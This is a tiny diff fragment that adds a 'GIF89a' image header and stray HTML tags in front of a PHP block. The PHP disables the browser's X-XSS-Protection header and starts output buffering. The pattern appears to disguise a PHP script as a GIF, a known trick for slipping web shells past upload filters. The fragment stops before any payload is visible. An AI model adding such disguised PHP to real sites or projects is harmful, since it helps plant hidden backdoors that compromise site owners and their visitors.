@@ -1,5 +1,7 @@
-
-
+GIF89a
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<center>
+<style>
 <?php 
 header("X-XSS-Protection: 0");
 ob_start();
